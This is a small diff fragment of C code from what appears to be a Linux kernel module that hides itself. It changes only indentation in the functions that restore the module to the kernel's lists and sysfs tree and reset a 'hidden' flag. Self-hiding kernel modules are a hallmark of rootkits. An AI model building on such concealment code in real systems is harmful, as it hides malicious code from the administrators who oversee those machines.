@@ -166,7 +166,7 @@ void unhide_module(struct module *mod, struct list_head *head) {
 	}
 
 	/* add module back in rbtree */
-    rb_add(mod->mkobj.kobj.sd);
+	rb_add(mod->mkobj.kobj.sd);
 }
 
 void unhide_dependencies(struct data_node *deps) {
@@ -191,7 +191,7 @@ void module_unhide(void) {
 	/* unhide our module */
 	unhide_module(THIS_MODULE, mod_prev);
 
-    /* set module to visible */
+	/* set module to visible */
 	module_is_hidden = 0;
 }
 
